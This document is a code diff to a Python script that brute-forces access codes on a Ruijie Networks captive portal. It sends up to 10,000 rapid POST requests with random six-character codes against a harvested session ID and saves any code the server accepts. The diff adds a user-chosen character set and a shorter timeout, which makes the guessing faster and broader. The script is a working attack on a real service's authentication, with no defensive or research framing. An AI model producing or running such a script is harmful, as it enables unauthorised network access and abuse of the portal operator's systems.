@@ -1,5 +1,6 @@
 import requests
 import random
+import string
 import time
 from urllib.parse import urlparse, parse_qs
 
@@ -28,7 +29,7 @@ if not session_id:
     print("Error: sessionId not found in the referer link. Exiting.")
     exit(1)
 
-# Define headers for the request, including the manual referer link
+# Define headers for the request
 headers = {
     'authority': 'portal-as.ruijienetworks.com',
     'accept': '*/*',
@@ -37,7 +38,7 @@ headers = {
     'content-type': 'application/json',
     'origin': 'https://portal-as.ruijienetworks.com',
     'pragma': 'no-cache',
-    'referer': referer_link,  # Use manual referer link
+    'referer': referer_link,
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -48,25 +49,47 @@ headers = {
 }
 
 # Define query parameters
-params = {
-    'lang': 'en_US',
-}
+params = {'lang': 'en_US'}
 
 # File to store the successful access codes
 output_file = "codes.txt"
 
-# Loop to generate and use codes 100 times
+# User input for code generation
+print("Choose the access code type:")
+print("(1) Numbers (0-9)")
+print("(2) Lowercase letters (a-z)")
+print("(3) Numbers and lowercase letters (0-9 and a-z)")
+print("(4) Custom range (e.g., 'abcd1234')")
+choice = int(input("Enter your choice (1-4): "))
+
+# Initialize code generation based on choice
+if choice == 1:
+    char_range = string.digits
+elif choice == 2:
+    char_range = string.ascii_lowercase
+elif choice == 3:
+    char_range = string.ascii_lowercase + string.digits
+elif choice == 4:
+    char_range = input("Enter your custom range (e.g., 'abcd1234'): ")
+    if not char_range:
+        print("Invalid custom range. Exiting.")
+        exit(1)
+else:
+    print("Invalid choice. Exiting.")
+    exit(1)
+
+# Loop to generate and use codes 10000 times
 for i in range(10000):
-    # Generate a random 6-digit access code
-    access_code = str(random.randint(100000, 999999))
-    
+    # Generate a random access code based on user choice
+    access_code = ''.join(random.choices(char_range, k=6))
+
     # Define the JSON payload
     json_data = {
         'accessCode': access_code,
-        'sessionId': session_id,  # Use sessionId extracted from referer link
+        'sessionId': session_id,
         'apiVersion': 1,
     }
-    
+
     # Send the POST request with error handling
     try:
         response = requests.post(
@@ -75,15 +98,15 @@ for i in range(10000):
             cookies=cookies,
             headers=headers,
             json=json_data,
-            timeout=10  # Timeout in seconds
+            timeout=5
         )
-        response.raise_for_status()  # Raise an error for HTTP codes >= 400
-        
+        response.raise_for_status()
+
         print(f"Request {i + 1}:")
         print(f"Access Code: {access_code}")
         print(f"Response Status Code: {response.status_code}")
         print(f"Response Body: {response.text}\n")
-        
+
         # Check if the response contains "true"
         if "true" in response.text:
             # Save the access code to a file
@@ -92,6 +115,6 @@ for i in range(10000):
             print(f"Access code {access_code} saved to {output_file}\n")
     except requests.exceptions.RequestException as e:
         print(f"Request {i + 1} failed: {e}")
-    
-    # Optional delay to avoid overwhelming the server
-    time.sleep(0.001)  # Wait 1 second between requests
+
+    # Delay between requests
+    time.sleep(0.001)
